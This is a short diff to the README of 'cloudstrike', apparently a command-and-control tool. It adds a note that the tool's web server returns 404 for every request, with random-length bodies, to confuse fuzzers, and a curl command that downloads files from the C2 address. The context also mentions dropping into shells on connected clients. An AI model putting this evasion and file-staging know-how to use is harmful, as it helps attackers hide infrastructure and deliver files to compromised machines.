@@ -29,7 +29,9 @@ You also need to configure the following constants in `cloudstrike.py`
 
 Taffic to C2_PORT that contains the magic string in the initial request will be forwarded automatically to the web server!  
 
-You can access the web server at `C2_ADDR:C2_WEB_PORT/{magic}/some file`. You can get the current magic string from the cloudstrike command `magic`.
+You can access the web server at `C2_ADDR:C2_WEB_PORT/{magic}/some_file`. You can get the current magic string from the cloudstrike command `magic`.  
+The flask web server will also respond with a status code of 404 to every request (even if the file is found) and returns a string of random length when no file is found to confuse fuzzers.  
+(This also means wget C2_ADDR:C2_WEB_PORT/{magic}/some_file won't work because wget reacts to the 404 status code. Instead use curl -O C2_ADDR:C2_WEB_PORT/{magic}/some_file)
 
 #### Available Functions
 - `use <id>` : if you have connected clients you can use this to drop into the shell
